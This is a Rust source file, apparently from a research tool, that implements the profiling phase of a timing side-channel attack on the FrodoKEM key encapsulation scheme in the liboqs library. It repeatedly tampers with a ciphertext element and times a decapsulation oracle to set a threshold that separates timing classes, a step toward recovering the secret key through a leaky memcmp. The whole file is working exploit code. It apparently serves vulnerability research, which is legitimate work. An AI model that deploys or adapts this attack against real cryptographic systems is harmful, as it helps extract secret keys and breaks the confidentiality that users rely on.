use super::modify_and_measure::*;
use crate::attack::memcmp_frodo::MeasureSource;
use crate::utils::Recorder;
use liboqs_rs_bindings as oqs;
use log::{debug, error, info, warn};
use log_derive::logfn_inputs;
use oqs::frodokem::FrodoKem;
use oqs::frodokem::KemBuf;

const THRESHOLD_WARN: u64 = 2000;

#[logfn_inputs(Trace)]
pub fn profile<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    measure_source: MeasureSource,
    mut public_key: &mut FRODO::PublicKey,
    mut secret_key: &mut FRODO::SecretKey,
) -> Result<u64, String> {
    info!(
        "Launching the profile routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut ciphertext = FRODO::Ciphertext::new();

    info!("Encapsulating shared secret and generating ciphertext using normal encaps routine");
    let mut shared_secret_e = FRODO::SharedSecret::new();
    let mut shared_secret_d = FRODO::SharedSecret::new();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO, _>(
        0,
        0,
        warmup,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::minval(),
    )?;
    debug!("Minimum latency during warmup {}", warmuptime);

    let last_index = FRODO::C::len() - 1;
    let lowmod = 1;

    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish upper bound timing threshold.", iterations, last_index, lowmod);
    let threshold_high = mod_measure::<FRODO, _>(
        lowmod,
        last_index,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, lowmod)),
    )?;

    let maxmod = error_correction_limit::<FRODO>() * 2;

    info!("Profiling phase ==> Running {} iterations ciphertextmod of C[{}] += {}, to establish lower bound timing threshold.", iterations, last_index, maxmod);
    let threshold_low = mod_measure::<FRODO, _>(
        maxmod,
        last_index,
        iterations,
        &measure_source,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
        &mut Recorder::medianval(format!("PROFILE[{}]{{{}}}", last_index, maxmod)),
    )?;

    if threshold_high <= threshold_low {
        error!(
            "threshold high ({}) <= threshold low ({})",
            threshold_high, threshold_low
        );
        return Err("Could not make a good enough profile, try again with a higher profiling iteration count!".to_string());
    }

    let diff = threshold_high - threshold_low;

    if diff < THRESHOLD_WARN {
        warn!("Diff ({}) < ", THRESHOLD_WARN);
    }

    let threshold = threshold_low + (diff / 2);
    info!(
        "Using ({}+{})/2={} as threshold value (diff: {}), everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold, threshold_high - threshold_low
    );

    Ok(threshold)
}
